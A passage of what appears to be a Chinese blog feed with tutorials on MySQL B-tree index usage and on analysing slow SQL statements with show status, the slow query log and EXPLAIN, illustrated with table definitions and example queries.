&lt;li>R-tree 索引（空间索引）：MyIsam 存储引擎支持的一个特殊索引类型。主要用于地理空间数据类型。&lt;/li>
&lt;li>Full-text 索引：全文索引也是 MyIsam 的特殊索引类型。&lt;/li>
&lt;/ul>
&lt;p>B-tree 索引是一个结构类似二叉树的索引。本篇文章只介绍 B-tree 索引的运用，关于其他索引请自行查阅网络资料进行学习。&lt;/p>
&lt;h2 id="能够使用索引的典型场景">能够使用索引的典型场景&lt;/h2>
&lt;h4 id="全值匹配">全值匹配&lt;/h4>
&lt;p>有如下一张测试表。主键为 id，无任何其他索引。
&lt;img src="http://static.zybuluo.com/mikumikulch/zuqchbxkq2maphi6pxhsw4ak/image_1bg37jhm96kr1qgl1864cobor39.png" alt="image_1bg37jhm96kr1qgl1864cobor39.png-31.8kB">&lt;/p>
&lt;p>指定索引中所有列的具体值。索引中的所有列，都有等值匹配的条件。
现在看看 explain 的返回值情况。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_table &lt;span style="color:#66d9ef">where&lt;/span> id &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/rkgjhif22l9vc8hhriolvfbw/image_1bg3j72qh160nmvnta15um1n2434.png" alt="image_1bg3j72qh160nmvnta15um1n2434.png-40.7kB">&lt;/p>
&lt;p>explain 输出结果中字段 type 的值为 const，表示为常量。即对索引中的列有等值的匹配条件。
字段 key 的值为 Primary。表示索引优化器选择了主键索引进行优化。&lt;/p>
&lt;h4 id="匹配值的范围查询">匹配值的范围查询&lt;/h4>
&lt;p>现在我们给 test_table 这张表增加两个索引，如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">CREATE&lt;/span> &lt;span style="color:#66d9ef">TABLE&lt;/span> &lt;span style="color:#f92672">`&lt;/span>test_table&lt;span style="color:#f92672">`&lt;/span> (
&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">NOT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span> AUTO_INCREMENT,
&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>birthday&lt;span style="color:#f92672">`&lt;/span> datetime &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>phone&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>note&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#66d9ef">PRIMARY&lt;/span> &lt;span style="color:#66d9ef">KEY&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span>),
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>NAME&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE,
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>AGE&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE
) ENGINE&lt;span style="color:#f92672">=&lt;/span>InnoDB AUTO_INCREMENT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">145&lt;/span> &lt;span style="color:#66d9ef">DEFAULT&lt;/span> CHARSET&lt;span style="color:#f92672">=&lt;/span>utf8
&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在尝试对索引的值进行范围查找。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_table &lt;span style="color:#66d9ef">where&lt;/span> age &lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> age &lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/do5xtj56ywqrkdmicotw5089/image_1bgoc670t130r1l2g11qp1e569nu9.png" alt="image_1bgoc670t130r1l2g11qp1e569nu9.png-46.8kB">
type 为 range，说明优化器选择范围查询。索引 key 为 AGE 代表选择了 AGE 索引来加速访。注意本例中的 Extra 字段。Using index condition 代表在利用索引查询后，还需要对索引回表查询数据。但是把数据过滤操作下放到了存储引擎，从而减少了 IO 处理。&lt;/p>
&lt;h3 id="匹配最左前缀">匹配最左前缀&lt;/h3>
&lt;p>利用索引进行查询时，一定要遵循左前缀查询规则。
首先在表上建立一个复合索引如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">CREATE&lt;/span> &lt;span style="color:#66d9ef">TABLE&lt;/span> &lt;span style="color:#f92672">`&lt;/span>test_table&lt;span style="color:#f92672">`&lt;/span> (
&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">NOT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span> AUTO_INCREMENT,
&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>birthday&lt;span style="color:#f92672">`&lt;/span> datetime &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>phone&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>note&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#66d9ef">PRIMARY&lt;/span> &lt;span style="color:#66d9ef">KEY&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span>),
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>NAME&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE,
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>AGE&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE,
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>LeftMostPreFix&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span>,&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE
) ENGINE&lt;span style="color:#f92672">=&lt;/span>InnoDB AUTO_INCREMENT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">145&lt;/span> &lt;span style="color:#66d9ef">DEFAULT&lt;/span> CHARSET&lt;span style="color:#f92672">=&lt;/span>utf8
&lt;/code>&lt;/pre>&lt;/div>&lt;p>LeftMostPreFix 索引由 name、address 两列组成。在使用这个索引进行查询时，只有 name 、name and address 可以生效。
直接使用 address 或者 address 以及 name 进行查询时候，索引都无法生效。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql"> &lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_table &lt;span style="color:#66d9ef">where&lt;/span> name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39; 张&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> address &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;东京&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/o5vmlkjzc4cpk277mksigi8p/image_1bg3g3bhb4ftec14kro8ns542a.png" alt="image_1bg3g3bhb4ftec14kro8ns542a.png-50.8kB">&lt;/p>
&lt;p>但是，如果仅仅是使用 address 进行查询的话，则复合索引无法产生效果。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql"> &lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_table &lt;span style="color:#66d9ef">where&lt;/span> address &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;东京&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/msjvr9xl1a7yhvy5aeoquuen/image_1bg3g4sv21oqh8be1bud1ptl114h9.png" alt="image_1bg3g4sv21oqh8be1bud1ptl114h9.png-41.9kB">&lt;/p>
&lt;h3 id="覆盖索引查询">覆盖索引查询&lt;/h3>
&lt;p>当查询的所有列都处在索引字段中时，查询的效率会更高。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql"> &lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> name &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_table &lt;span style="color:#66d9ef">where&lt;/span> name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39; 林&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/dg1ue7q34iad5n5gh3doh6aw/image_1bg3g8fg71pj3rck1j7p13cg1clhm.png" alt="image_1bg3g8fg71pj3rck1j7p13cg1clhm.png-46.2kB">&lt;/p>
&lt;p>Extra 变成了 Using index。代表只需要访问索引就能得到全部数据，不需要通过索引获得地址后，再回表进行扫描。&lt;/p>
&lt;h3 id="左匹配列前缀">左匹配列前缀&lt;/h3>
&lt;p>like 查询是一种常见的查询方式。和左前缀原则一样，进行 like 查询时也需要遵循左前缀匹配原则。&lt;/p>
&lt;p>首先对表增加 address 列的索引。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">CREATE&lt;/span> &lt;span style="color:#66d9ef">TABLE&lt;/span> &lt;span style="color:#f92672">`&lt;/span>test_table&lt;span style="color:#f92672">`&lt;/span> (
&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">NOT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span> AUTO_INCREMENT,
&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>birthday&lt;span style="color:#f92672">`&lt;/span> datetime &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>phone&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>note&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#66d9ef">PRIMARY&lt;/span> &lt;span style="color:#66d9ef">KEY&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span>),
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>NAME&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE,
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>AGE&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE,
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>LeftMostPreFix&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span>,&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE,
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>ADDRESS&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE
) ENGINE&lt;span style="color:#f92672">=&lt;/span>InnoDB AUTO_INCREMENT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">145&lt;/span> &lt;span style="color:#66d9ef">DEFAULT&lt;/span> CHARSET&lt;span style="color:#f92672">=&lt;/span>utf8
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接着尝试使用 like 检索数据。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql"> &lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_table &lt;span style="color:#66d9ef">where&lt;/span> address &lt;span style="color:#66d9ef">like&lt;/span> &lt;span style="color:#e6db74">&amp;#39;东%&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/cn6bna9ean95xmexjo5ivd1b/image_1bg3gpoh0126g1nbm1m64fsj1fmd1g.png" alt="image_1bg3gpoh0126g1nbm1m64fsj1fmd1g.png-45.1kB">
成功运用到索引 ADDRESS。查询类型为 range。&lt;/p>
&lt;p>然后违背左前缀匹配原则，使用 Like 关键字再查询一次。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_table &lt;span style="color:#66d9ef">where&lt;/span> address &lt;span style="color:#66d9ef">like&lt;/span> &lt;span style="color:#e6db74">&amp;#39;%京&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/iid14z7dnq9zv9b6ri3f4qeg/image_1bg3gr2rd4to4p01v9c74o7nn1t.png" alt="image_1bg3gr2rd4to4p01v9c74o7nn1t.png-41.9kB">&lt;/p>
&lt;p>type 为 ALL、key 为 null 表示该次查询未使用索引，而是通过全表扫描进行了查询。全表扫描的性能在数据量较大时比较低下，应该尽量频繁进行全表扫描查询。&lt;/p>
&lt;h3 id="多条件匹配">多条件匹配&lt;/h3>
&lt;p>使用 and 关键字查询是需求中常见的一种情况。
那么针对下面这样的索引结果，使用 and 关键字会带来怎样的查询效果呢？&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">CREATE&lt;/span> &lt;span style="color:#66d9ef">TABLE&lt;/span> &lt;span style="color:#f92672">`&lt;/span>test_table&lt;span style="color:#f92672">`&lt;/span> (
&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">NOT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span> AUTO_INCREMENT,
&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>birthday&lt;span style="color:#f92672">`&lt;/span> datetime &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>phone&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>note&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#66d9ef">PRIMARY&lt;/span> &lt;span style="color:#66d9ef">KEY&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span>),
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>NAME&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE,
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>AGE&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE,
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>LeftMostPreFix&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span>,&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE,
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>ADDRESS&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE
) ENGINE&lt;span style="color:#f92672">=&lt;/span>InnoDB AUTO_INCREMENT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">145&lt;/span> &lt;span style="color:#66d9ef">DEFAULT&lt;/span> CHARSET&lt;span style="color:#f92672">=&lt;/span>utf8
&lt;/code>&lt;/pre>&lt;/div>&lt;p>尝试使用 name 与 age 的组合条件进行匹配与范围查询。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> name &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_table &lt;span style="color:#66d9ef">where&lt;/span> name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;张&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> age &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>![image_1bg3i2mo0tslo88im17t51vfn2a.png-49.9kB][9]&lt;/p>
&lt;p>表中含有索引 name 但没有 name 与 age 的复合索引。所以本次查询首先通过 NAME 索引定位到表地址，然后 using where 回表扫描根据 age &amp;lt; 20 过滤掉不符合条件的数据。由于 age &amp;lt; 20 条件的存在，即使语句只查询了 name 字段也必须回表扫描从而无法形成索引覆盖查询，对查询性能造成了影响。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>以上场景包含了精确匹配、模糊匹配、范围匹配、多条件匹配的查询语句，大部分业务用的查询都离不开这四种范畴。只要在使用索引时牢记住：&lt;/p>
&lt;ul>
&lt;li>左前缀原则&lt;/li>
&lt;li>尽量使用索引覆盖查询&lt;/li>
&lt;li>索引常量的查询比范围索引查询效率更高&lt;/li>
&lt;li>当查询涉及范围查询时，尽量将精确匹配的条件放在前面。&lt;/li>
&lt;li>一张表中的索引只会被使用一次（or 条件语句除外）。mysql 会选择最优结果使用相应的索引。&lt;/li>
&lt;/ul>
&lt;p>便能享受索引所带来的性能提升。在下一章节，将会继续分享常见的索引误用场景。学会运用索引并且避免误用索引，是应对业务中常见的查询语句性能问题的关键所在。&lt;/p>
&lt;hr>
&lt;p>&lt;em>参考书籍&lt;/em>
&lt;em>《深入浅出 mysql》&lt;/em>&lt;/p></description></item><item><title>分析 SQL 语句的一般步骤</title><link>https://www.chucklin.net/post/analysesql/</link><pubDate>Thu, 20 Feb 2020 09:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/analysesql/</guid><description>&lt;p>数据库的性能调优是一个很大的话题。但是对于开发人员来讲，掌握一些常用的 SQL 优化手段却不是什么难事。
从本章节开始，将连载总结常用的适合于开发人员的 SQL 优化手段与大家分享。&lt;/p>
&lt;p>要想解决性能优化的问题，首先要想办法发现哪些 SQL 有性能问题。通过下面这几个手段可以比较准确的定位到有问题的 SQL 进行分析优化。&lt;/p>
&lt;h2 id="show-status-命令了解各种-sql-的执行频率">Show status 命令了解各种 SQL 的执行频率&lt;/h2>
&lt;p>在每一个 mysql session 中都可以使用 show status 命令查看当前数据库服务器的状态信息。如下所示：
&lt;img src="http://static.zybuluo.com/mikumikulch/r8kng6y5uh5bv0368tgww9g3/image_1bf763k1rs9j4kb66v1bnb1e1u9.png" alt="image_1bf763k1rs9j4kb66v1bnb1e1u9.png-75.2kB">&lt;/p>
&lt;p>Com_xxx 表示每个 xxx 语句执行的次数。具体每个参数的意思你可以通过官方手册进行查询。总而言之，show status 向你展示了当前 mysql 服务器的运行状态。&lt;/p>
&lt;h3 id="慢查询日志">慢查询日志&lt;/h3>
&lt;p>慢查询日志是 mysql 自带的几种日志中的一种。它会自动的记录任何查询时间超出你设置的自定义时间的 sql 语句到你指定的日志目录中。通过慢查询日志可以定位到执行效率较低的具体的 SQL 语句。
打开慢查询日志的方法等由于每个版本的 mysql 都有不同，请查阅相关的官方文档。&lt;/p>
&lt;h2 id="explain">Explain&lt;/h2>
&lt;p>通过慢查询日志，我们可以查询到效率低下的 SQL 语句。对于这些 SQL 语句又应该如何去分析它问题出在哪里呢？
&lt;img src="http://static.zybuluo.com/mikumikulch/ijvquijfj0905hhq7wwk43eu/image_1bf77g112l9c1aqd1g431vuncu6m.png" alt="image_1bf77g112l9c1aqd1g431vuncu6m.png-40.4kB">
explain select 语句所返回的结果包含了该查询语句的执行细节。
具体每一个列的含义可对照官方手册。这里我们只提最主要的一个列的含义【type】：访问类型。
常见的访问类型如下：&lt;/p>
&lt;ul>
&lt;li>all 全表扫描&lt;/li>
&lt;li>index 索引全表扫描。按照索引顺序扫描全表。避免排序工作。但实际上由于查询的字段不是在索引中，实际上还是走了全表扫描。&lt;/li>
&lt;li>range 索引范围扫描 如： &amp;lt;、&amp;gt;、between 等操作符&lt;/li>
&lt;li>ref 使用非唯一索引扫描或前缀扫描。&lt;/li>
&lt;li>eq-ref 每次与之前的表合并行都只在该表读取一行，这是除了 system，const 之外最好的一种。&lt;/li>
&lt;li>const、system 当检索条件对应到索引中为固定的值时，查询类型为 const。当查询的表只有一行时，查询类型为 system。&lt;/li>
&lt;li>NULL 不需要检索表就能得到结果，如 select 1&lt;/li>
&lt;/ul>
&lt;p>从上到下，性能由最差到最好。一般来说，至少也要优化语句达到 range 这个等级。&lt;/p>
&lt;h2 id="extra-列">Extra 列&lt;/h2>
